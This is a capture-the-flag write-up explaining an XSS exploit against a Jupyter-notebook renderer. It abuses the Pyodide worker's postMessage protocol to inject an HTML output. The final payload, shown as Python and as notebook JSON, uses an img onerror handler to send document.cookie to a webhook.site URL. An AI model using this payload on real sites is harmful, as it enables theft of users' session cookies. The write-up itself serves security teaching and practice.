# gas giant writeup

There's a lot of code to look at initially, but the first thing to find is on the server; we have an admin bot that we
can report URLs to, so the exploit is likely XSS.
```ts
export async function visit(url: string) {
    const browser = await puppeteer.launch({
        args: ['--no-sandbox', '--disable-gpu', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    await browser.setCookie({ name: 'flag', value: 'bctf{...}', domain: 'localhost' });

    console.log('Visiting:', url);

    await page.goto(url);

    // Wait for the run button to load, then run the cell
    await page.locator('button.cursor-pointer.text-right.px-1').setTimeout(20000).click();
    await sleep(5000);

    console.log('Done visiting :D')
}
```
So where can we get XSS? On the `/render` route on the client, it looks like we can pass arbitrary data to the
`JupyterNotebook` component,
```tsx
export default function NotebookPage() {
    const [params] = useSearchParams();
    const navigate = useNavigate();

    const [data, setData] = useState<Notebook | null>(null);
    const [error, setError] = useState<string | null>(null);

    useEffect(() => {
        const data = params.get('d');
        if (!data)
            return void navigate('/');

        try {
            const parsed = notebookSchema.parse(JSON.parse(atob(data)));
            setData(parsed);
        } catch (e) {
            setError(e instanceof Error ? e.message : ':(');
        }
    }, []);

    return error ? (
        <div className="h-screen w-screen flex items-center justify-center opacity-75">
            <div className="border border-red-500 rounded bg-red-500/20 text-red-600 px-5 py-3 min-w-116 max-w-132">
                <h3 className="font-semibold">
                    Error encountered when parsing notebook:
                </h3>
                <p>{error}</p>
            </div>
        </div>
    ) : !data ? (
        <div className="h-screen w-screen flex items-center justify-center opacity-75">
            Loading notebook...
        </div>
    ) : (
        <StyledNotebook
            notebook={data}
            className="container text-sm gap-4 py-20"
        />
    )
}
```
but we're limited by the following `zod` schema:
```ts
const markdownCellSchema = z.object({
    cell_type: z.literal('markdown'),
    source: z.union([z.string(), z.array(z.string())]),
    metadata: z.any()
})

const codeCellSchema = z.object({
    cell_type: z.literal('code'),
    source: z.union([z.string(), z.array(z.string())]),
    metadata: z.any(),
    execution_count: z.int().nullable(),
    outputs: z.array(z.any()).length(0) // ban code outputs
})

export const notebookSchema = z.object({
    metadata: z.any(),
    nbformat_minor: z.int(),
    nbformat: z.int(),
    cells: z.array(z.union([markdownCellSchema, codeCellSchema])),
})
```
Right off the bat, we can see that if we can inject arbitrary output into the Jupyter notebook, we can render HTML
(`trusted` is `true` by default) to get our XSS:
```tsx
    if (props.output.output_type === 'execute_result' || props.output.output_type === 'display_data') {
        const trusted = props.trusted ?? true;
        const mimes = props.output.data;

        // Image output
        if (mimes['image/png']) return (
            <img
                src={`data:image/png;base64,${mimes['image/png']}`}
                alt={mimes['text/plain']}
            />
        )

        // HTML output; potentially dangerous, so require `trusted` prop on parent
        if (trusted && mimes['text/html']) return (
            <div
                dangerouslySetInnerHTML={{ __html: mimes['text/html'] }}
            />
        )
```
(yes, this is intended behavior, and is also, as best as I can tell, what the [JupyterLite project](https://jupyter.org/try-jupyter/lab/) does.)

But since the `zod` schema forces our output field to have length `0`, we can't just create a Jupyter notebook with an
already-generated `text/html` output that contains our XSS payload.

Instead, notice that the admin clicks on the run button after loading the page, e.g. we get to execute one cell of
Python on their client.

So why isn't this enough to solve the challenge? After all, the library uses Pyodide as its web Python runtime
```js
import { loadPyodide } from "https://cdn.jsdelivr.net/pyodide/v0.29.0/full/pyodide.mjs";
```
and Pyodide [lets you access the `js` scope from Python](https://pyodide.org/en/stable/usage/api/python-api.html) via
```py
import js
```

But by itself, this isn't quite good enough, as the [library](https://github.com/ky28059/react-jupyter-renderer/blob/main/src/pyodideWorker.mjs)
executes Python in a [Web Worker](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API), which have their
own thread and global scope separated from the client's: experimentally, you can see that by trying
```py
import js
print(js)
dir(js)
```

and we don't have access DOM globals like `document` and so on.

However, we *do* have access to functions like `postMessage`!

Notice how the message-passing protocol between the client and Pyodide worker happens:
```tsx
    const executePython = useCallback((code: string, callback: (message: CodeCellOutput) => void) => {
        if (!worker) return;

        const currId = getId();

        // Listen for messages that match the current ID
        worker.addEventListener('message', function listener(e) {
            if (e.data.id !== currId) return;

            // No more messages will be sent; remove the listener and allow requests again
            if (e.data.output_type === 'done') {
                setReady(true);
                return worker.removeEventListener('message', listener);
            }

            const { id, ...rest } = e.data;
            callback(rest as CodeCellOutput);
        });

        setReady(false);
        worker.postMessage({ id: currId, python: code });
    }, [worker]);
```
Namely, the client determines whether messages were meant for the current cell's execution via an integer `id` field. If
the client receives a message with a matching `id`, it emits the rest of the message to the callback as a cell output.

Also, since `id`s are just [auto-incremented](https://github.com/ky28059/react-jupyter-renderer/blob/main/src/pyodideWorkerClient.ts), this field is predictable as long as you know how many cells were already
executed in the current page load.
```ts
let lastId = 1;
export function getId() {
    return lastId++;
}
```

Thus, the idea is to use `postMessage` to manually inject your own `text/html` code output that gets rendered outside of
the worker for XSS, for a payload like
```py
import js
js.postMessage({ "id": 1, "output_type": "execute_result", "data": { "text/html": "<img src=x onerror='fetch(`https://webhook.site/...?a=${document.cookie}`)'>" }})
```
(we know the `id` when the admin runs the code cell will be `1`, as it will be the first request to the worker.)

If you tried to run this, however, you'd run into an exception:
```
JsException: DataCloneError: Failed to execute 'postMessage' on 'DedicatedWorkerGlobalScope': [object Object] could not be cloned.
```

This is due to the way Pyodide [proxies objects between JavaScript and Python](https://pyodide.org/en/stable/usage/type-conversions.html#proxying).
Any of the methods they use to create a JS `object` in the above link should work to fix this, e.g. using `run_code` or
even `js.eval`.

The final payload then is:

```py
import js
obj = js.eval('({ id: 1, output_type: "execute_result", data: { "text/html": "<img src=x onerror=\'fetch(`https://webhook.site/...?a=${document.cookie}`)\'>" }})')
js.postMessage(obj)
```

By looking at the Jupyter file format from above, encoding the above as a single Python cell in a notebook gives
something like
```json
{
    "metadata": {},
    "nbformat_minor": 4,
    "nbformat": 4,
    "cells": [
        {
            "cell_type": "code",
            "source": "import js\nobj = js.eval('({ id: 1, output_type: \"execute_result\", data: { \"text/html\": \"<img src=x onerror=\\'fetch(`https://webhook.site/...?a=${document.cookie}`)\\'>\" }})')\njs.postMessage(obj)",
            "metadata": {},
            "outputs": [],
            "execution_count": null
        }
    ]
}
```
which we can upload and report for the flag.
